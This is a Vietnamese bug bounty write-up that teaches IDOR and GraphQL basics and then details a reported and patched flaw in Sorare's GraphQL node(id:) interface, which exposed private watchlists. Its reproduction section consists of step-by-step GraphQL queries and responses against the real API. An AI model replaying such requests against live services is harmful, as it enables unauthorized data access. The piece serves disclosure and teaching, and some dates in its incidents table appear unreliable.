---
title: "Phân tích lỗ hổng IDOR thực tế — Case Study: Sorare GraphQL"
description: "Phân tích chi tiết lỗ hổng IDOR trên Sorare qua GraphQL, tìm hiểu cơ sở lý thuyết và case study thực tế."
author: "toobunbo"
date: "2026-07-04"
categoryEn: "RESEARCH"
categoryJp: "研究"
difficulty: "hard"
tags: ["bug bounty", "idor", "graphql"]
hot: true
cover: "assets/blogVip.jpg"
---

# Chương 1 — Cơ sở Lý thuyết

## 1.1 Lỗ hổng IDOR

### IDOR là gì?

IDOR — Insecure Direct Object Reference (Tham chiếu đối tượng trực tiếp không an toàn) là lỗ hổng xảy ra khi ứng dụng cho phép người dùng truy cập thẳng vào một tài nguyên chỉ bằng ID, mà không kiểm tra họ có quyền xem tài nguyên đó không.

### Ví dụ đơn giản

Giả sử bạn vừa đặt hàng online và nhận được link xem đơn hàng:

```
https://shop.com/orders/10045
```

Bạn thử đổi số thành `10044`:

```
https://shop.com/orders/10044
```

Nếu server trả về đơn hàng của người khác — đó là IDOR.

### Tại sao IDOR xảy ra?

Vấn đề nằm ở logic phía server. Hãy so sánh hai cách xử lý:

**Sai — dễ bị IDOR:**

```
Nhận ID → Tìm trong database → Trả về luôn
```

**Đúng:**

```
Nhận ID → Tìm trong database → Kiểm tra: người gọi có phải chủ sở hữu không? → Mới trả về
```

Developer thường quên bước kiểm tra quyền ở một số endpoint nhất định — đặc biệt các endpoint "tiện ích" được thêm vào sau, hoặc các interface dùng chung như `node(id:)` trong GraphQL (sẽ giải thích ở phần 1.3).

### IDOR nguy hiểm đến mức nào?

IDOR nằm trong danh sách OWASP Top 10 — top 10 lỗ hổng web nguy hiểm nhất thế giới. Một số vụ thực tế:

| Năm | Nền tảng | Hậu quả |
|-----|----------|---------|
| 2021 | Pandabuy | Lộ 3 triệu đơn hàng của người dùng |
| 2022 | Optus (Úc) | Lộ dữ liệu cá nhân 11 triệu khách hàng |
| 2023 | T-Mobile | Lộ thông tin hàng triệu tài khoản |

---

## 1.2 API là gì?

Hãy tưởng tượng bạn đang ngồi ở một nhà hàng. Bạn không vào thẳng bếp để lấy đồ ăn — thay vào đó, bạn gọi phục vụ, đưa yêu cầu, và phục vụ mang đồ ra cho bạn.

API (Application Programming Interface) hoạt động theo cách tương tự:

```
Client (App / Trình duyệt)
        │
        │  Gửi yêu cầu (Request)
        ▼
┌──────────────┐
│     API      │  ← Kiểm tra quyền, xử lý logic
└──────────────┘
        │
        │  Trả về dữ liệu (Response)
        ▼
      Server / Database
```

- Client không trực tiếp truy cập vào database
- API là lớp trung gian — nhận yêu cầu, kiểm tra quyền, trả về dữ liệu phù hợp
- Mọi thứ bạn thấy trên web (feed, profile, danh sách sản phẩm...) đều đi qua API

> API giống như bảo vệ tòa nhà — kiểm soát ai được vào, được lấy gì. IDOR xảy ra khi bảo vệ này không hỏi thẻ trước khi cho vào.

---

## 1.3 REST API vs GraphQL

Có nhiều "ngôn ngữ" để API giao tiếp. Hai phổ biến nhất là REST và GraphQL.

### REST API — Cách truyền thống

Mỗi loại dữ liệu có một đường dẫn (endpoint) riêng:

```
GET /users/123          → lấy thông tin user 123
GET /users/123/posts    → lấy bài viết của user 123
GET /watchlists/456     → lấy watchlist 456
```

Muốn lấy gì thì gọi đúng đường dẫn đó.

### GraphQL — Cách hiện đại

GraphQL chỉ có một endpoint duy nhất (`/graphql`), nhưng client tự mô tả chính xác dữ liệu mình cần thông qua một ngôn ngữ truy vấn riêng.

Nếu bạn đã từng viết SQL, GraphQL query sẽ rất quen thuộc:

```sql
-- SQL truyền thống
SELECT username, email
FROM users
WHERE slug = 'alice'
```

```graphql
# GraphQL — ý tưởng tương tự, cú pháp khác
query {
  user(slug: "alice") {
    username
    email
  }
}
```

Thậm chí có thể join nhiều bảng trong một query — tương tự JOIN trong SQL:

```sql
-- SQL: lấy user + danh sách watchlist + tên cầu thủ trong watchlist
SELECT u.username, w.title, p.displayName
FROM users u
JOIN watchlists w ON w.owner_id = u.id
JOIN players p ON p.watchlist_id = w.id
WHERE u.slug = 'alice'
```

```graphql
# GraphQL: cùng dữ liệu, một request duy nhất
query {
  user(slug: "alice") {
    username
    watchlists {
      title
      players { displayName }
    }
  }
}
```

| | REST | GraphQL |
|--|------|---------|
| Số endpoint | Nhiều | Một (`/graphql`) |
| Dữ liệu trả về | Cố định theo endpoint | Client tự chọn field |
| Phổ biến ở | API truyền thống | App hiện đại (Sorare, GitHub, Shopify...) |

### `node(id:)` — Interface đặc biệt trong GraphQL

Nhiều hệ thống GraphQL triển khai một interface gọi là `node(id:)` — hoạt động như một "cổng tra cứu toàn năng": biết ID của object nào cũng có thể truy vấn thẳng đến nó, bất kể loại object là gì.

Tương đương SQL sẽ là:

```sql
-- Tìm bất kỳ object nào theo ID, không phân biệt bảng
SELECT * FROM any_table WHERE global_id = '63ba06b8-...'
```

```graphql
# GraphQL: node(id:) làm đúng điều đó
query {
  node(id: "Watchlist:63ba06b8-...") {
    ... on Watchlist { title public }
  }
}
```

> **Lưu ý:** `node(id:)` rất tiện — nhưng cũng là điểm nguy hiểm nếu quên kiểm tra quyền truy cập, vì nó có thể resolve bất kỳ loại object nào trong hệ thống.

---

## 1.4 Tóm tắt — Kết nối vào bug sắp phân tích

| Khái niệm | Vai trò trong bug này |
|-----------|----------------------|
| IDOR | Lớp lỗ hổng mà bug này thuộc về |
| API / GraphQL | Nền tảng API mà Sorare sử dụng |
| `node(id:)` | Interface GraphQL bị khai thác để bypass access control |
| Watchlist | Object bị lộ dữ liệu dù đã được đặt thành private |

Với nền tảng lý thuyết trên, chúng ta sẽ đi vào phân tích cụ thể bug được tìm thấy trên Sorare — một IDOR thực tế, đã được xác nhận và reward bởi chương trình Bug Bounty.

---

# Chương 2 — Case Study: Private Watchlist accessible to unauthenticated users via node(id:) interface - Reward 250 usd - Low security impact

## 2.1 Mục tiêu — Sorare (HackerOne)

Sorare là nền tảng game fantasy football kết hợp NFT, cho phép người chơi mua, bán và thu thập card cầu thủ kỹ thuật số, sau đó dùng chúng để tham gia các giải đấu.

Sorare sử dụng GraphQL API tại endpoint `https://api.sorare.com/graphql` cho toàn bộ hoạt động của ứng dụng.

Chương trình Bug Bounty của Sorare được vận hành trên nền tảng HackerOne tại `https://hackerone.com/sorare`.

### Watchlist trong Sorare là gì?

Watchlist là tính năng cho phép người dùng tạo danh sách theo dõi cầu thủ mà họ quan tâm — tương tự "playlist" nhưng dành cho cầu thủ bóng đá.

Mỗi Watchlist có hai chế độ:

| Chế độ | Ý nghĩa |
|--------|---------|
| `public: true` | Bất kỳ ai cũng có thể xem |
| `public: false` | Chỉ chủ sở hữu mới được xem |

> **Tại sao Watchlist lại nhạy cảm?** Danh sách cầu thủ một người theo dõi có thể tiết lộ chiến lược đầu tư hoặc kế hoạch mua card trong thị trường NFT — thông tin có giá trị thực tế.

---

## 2.2 Mô tả lỗ hổng

### Vấn đề nằm ở đâu?

Sorare có hai cách để truy vấn Watchlist qua GraphQL:

**Cách 1 — `publicWatchlists`:** Truy vấn danh sách watchlist công khai của một user.

```graphql
query {
  user(slug: "alice") {
    publicWatchlists(sport: FOOTBALL) {
      nodes { id title public }
    }
  }
}
```

Endpoint này có kiểm tra flag `public` — nếu watchlist là private, nó sẽ không xuất hiện.

**Cách 2 — `node(id:)`:** Truy vấn thẳng đến một object bằng ID.

```graphql
query {
  node(id: "Watchlist:63ba06b8-...") {
    ... on Watchlist { id title public }
  }
}
```

Endpoint này **không** kiểm tra flag `public` — trả về dữ liệu bất kể watchlist là public hay private.

### Hậu quả

Hai endpoint xử lý cùng một loại dữ liệu nhưng chỉ một bên thực thi access control. Đây là điểm mấu chốt tạo ra lỗ hổng IDOR.

```
publicWatchlists  →  Kiểm tra quyền   →  An toàn
node(id:)         →  Bỏ qua kiểm tra  →  Lộ dữ liệu
```

---

## 2.3 Attack Chain

Dưới đây là chuỗi tấn công hoàn chỉnh từ đầu đến cuối:

```
┌─────────────────────────────────────────────────────────────┐
│                        ATTACK CHAIN                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  [1] Victim tạo Watchlist PUBLIC, thêm cầu thủ vào          │
│                        │                                    │
│                        ▼                                    │
│  [2] Attacker truy vấn publicWatchlists → lấy được UUID     │
│      (không cần đăng nhập)                                  │
│                        │                                    │
│                        ▼                                    │
│  [3] Victim đổi Watchlist sang PRIVATE                      │
│      → Victim nghĩ dữ liệu đã được bảo vệ                   │
│                        │                                    │
│                        ▼                                    │
│  [4] publicWatchlists → trả về rỗng (hoạt động đúng)        │
│                        │                                    │
│                        ▼                                    │
│  [5] Attacker dùng node(id: UUID) → đọc được toàn bộ        │
│      dữ liệu private — không cần đăng nhập                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

<Callout label="LƯU Ý" tone="accent" title="Điểm mấu chốt">
**Điểm mấu chốt:** UUID được thu thập ở bước [2] — khi watchlist còn public. Sau khi victim đổi sang private, UUID đó vẫn còn hiệu lực với `node(id:)`. Victim không có cách nào biết UUID đã bị lưu lại.
</Callout>

## 2.4 Steps to Reproduce

### Chuẩn bị

Cần hai tài khoản Sorare: một đóng vai Victim, một đóng vai Attacker.

---

### Bước 1 — Victim tạo Watchlist public và thêm cầu thủ

Victim tạo một watchlist ở chế độ public và thêm cầu thủ vào. Đây là trạng thái ban đầu hoàn toàn bình thường — người dùng chia sẻ watchlist của mình với cộng đồng.

**Request:**

```graphql
mutation {
  upsertWatchlist(input: { sport: FOOTBALL, title: "My Watchlist", public: true }) { ... }
}
```

**Response:**

```json
{ "id": "Watchlist:63ba06b8-...", "title": "My Watchlist", "public": true }
```

---

### Bước 2 — Attacker thu thập UUID từ watchlist public

Attacker truy vấn danh sách public watchlist của victim — không cần đăng nhập. UUID lộ ra ở đây là thứ attacker cần lưu lại. Đây là bước chuẩn bị — hoàn toàn hợp lệ vì watchlist đang public.

**Request:**

```graphql
query {
  user(slug: "victim_username") {
    publicWatchlists(sport: FOOTBALL) { nodes { id title } }
  }
}
```

**Response:**

```json
{ "id": "Watchlist:63ba06b8-...", "title": "My Watchlist", "public": true }
```

```bash
# Attacker lưu lại UUID này
WL_ID="Watchlist:63ba06b8-a3cf-444e-9bf9-e3376a36b67f"
```

---

### Bước 3 — Victim đổi Watchlist sang private

Victim quyết định bảo vệ dữ liệu của mình bằng cách chuyển watchlist sang chế độ private.

**Request:**

```graphql
mutation {
  upsertWatchlist(input: { watchlistId: "Watchlist:63ba06b8-...", public: false }) { ... }
}
```

**Response:**

```json
{ "id": "Watchlist:63ba06b8-...", "title": "My Watchlist", "public": false }
```

---

### Bước 4 — Xác nhận watchlist đã bị ẩn khỏi đường dẫn hợp lệ

Kiểm tra lại qua `publicWatchlists` — danh sách trả về rỗng, đúng như kỳ vọng. Victim nhìn thấy kết quả này và tin rằng dữ liệu đã được bảo vệ.

**Response:**

```json
{ "publicWatchlists": { "nodes": [] } }
```

---

### Bước 5 — Attacker đọc Watchlist private qua `node(id:)`

Attacker dùng UUID đã lưu từ Bước 2 để gọi thẳng vào `node(id:)`.

**Request:**

```graphql
query {
  node(id: "Watchlist:63ba06b8-...") {
    ... on Watchlist { id title public user { slug } playersPanel { ... } }
  }
}
```

**Victim kỳ vọng:** Watchlist đã private → request này phải bị từ chối hoặc trả về rỗng.

```json
{ "data": { "node": null } }
```

**Thực tế xảy ra:** Toàn bộ dữ liệu private bị trả về — không cần đăng nhập.

```json
{
  "data": {
    "node": {
      "title": "My Watchlist",
      "public": false,
      "user": { "slug": "victim_username" },
      "totalPlayersCount": 1,
      "playersPanel": [
        { "anyPlayer": { "displayName": "Mohamed Salah" } }
      ]
    }
  }
}
```

> **Bug được xác nhận:** `node(id:)` bỏ qua hoàn toàn flag `public: false` và trả về dữ liệu cho bất kỳ ai biết UUID.

---

## 2.5 Tác động (Impact) & Đánh giá Severity

### Dữ liệu thực sự bị lộ là gì?

Trước khi đánh giá mức độ nghiêm trọng, cần nhìn thẳng vào những gì attacker thực sự đọc được:

| Field bị lộ | Bản chất |
|-------------|---------|
| `title` | Tên watchlist do victim tự đặt |
| `slug` | Định danh công khai của watchlist |
| `user.slug` | Username công khai của victim |
| `displayName` của cầu thủ | Tên cầu thủ — thông tin hoàn toàn công khai |

> **Không có:** thông tin cá nhân (PII), email, mật khẩu, dữ liệu tài chính, địa chỉ ví crypto, hay bất kỳ thông tin nhạy cảm nào liên quan đến tài khoản.

---

### Tại sao đây vẫn là bug hợp lệ?

Bug này có thật và đã được Sorare xác nhận và vá. Lý do nó hợp lệ:

**Về mặt kỹ thuật** — Hệ thống hoạt động sai so với intent. Victim chủ động đổi sang private với kỳ vọng dữ liệu được bảo vệ, nhưng server không thực thi điều đó trên `node(id:)`. Đây là broken access control rõ ràng.

**Về mặt nguyên tắc** — Người dùng có quyền thu hồi quyền truy cập vào dữ liệu của mình. Khi họ đổi sang private, hệ thống phải tôn trọng quyết định đó ở mọi endpoint.

---

### Tại sao Sorare đánh giá là Low?

Sorare đánh giá bug này ở mức Low severity với lập luận:

**1. Dữ liệu không nhạy cảm**

Tất cả những gì bị lộ — tên watchlist, tên cầu thủ — đều là thông tin công khai. Không có PII hay dữ liệu tài chính nào bị ảnh hưởng.

**2. Dữ liệu từng là public**

Toàn bộ attack chain chỉ có thể xảy ra nếu victim đã từng public watchlist đó. Attacker không đọc được gì mà trước đây không ai thấy — họ chỉ tiếp tục đọc được thứ victim đã tự công bố.

**3. Không có tác động tài chính**

Watchlist không chứa giá mua, lịch sử giao dịch, hay tín hiệu thị trường nào. Không có con đường thực tế nào từ việc đọc watchlist dẫn đến thiệt hại vật chất.

**4. CVSS Score**

```
AV:N  — Network: khai thác qua internet
AC:L  — Attack Complexity: thấp, không cần điều kiện đặc biệt
PR:N  — Privileges Required: không cần đăng nhập
UI:N  — User Interaction: không cần victim thao tác gì thêm
C:L   — Confidentiality: lộ dữ liệu ở mức thấp
I:N   — Integrity: không ảnh hưởng
A:N   — Availability: không ảnh hưởng

→ CVSS Score: Low
```

---

### Bài học về Severity Assessment

Đây là điểm quan trọng mà người mới làm bug bounty hay nhầm:

**Bug hợp lệ ≠ Bug nghiêm trọng**

Một bug có thể real và được vá nhưng vẫn được đánh giá thấp nếu dữ liệu bị lộ không nhạy cảm. Severity phụ thuộc vào impact thực tế, không chỉ vào việc access control có bị bypass hay không.

| Câu hỏi cần tự hỏi | Trong bug này |
|--------------------|---------------|
| Dữ liệu bị lộ có nhạy cảm không? | Không — tên cầu thủ, tên watchlist |
| Attacker có thể làm gì với dữ liệu đó? | Gần như không có hành động tiếp theo |
| Victim có bị thiệt hại thực tế không? | Không đo lường được |
| Hành vi có đúng với intent của hệ thống không? | Không — đây là lý do bug được chấp nhận |

> **Takeaway:** Khi viết report bug bounty, đừng chỉ chứng minh bug tồn tại — hãy lập luận rõ dữ liệu bị lộ là gì và attacker có thể làm gì tiếp theo. Đó là yếu tố quyết định severity và reward.

~~ai cần thông tin gì thêm về post này thì liên hệ`caterpie22` a~~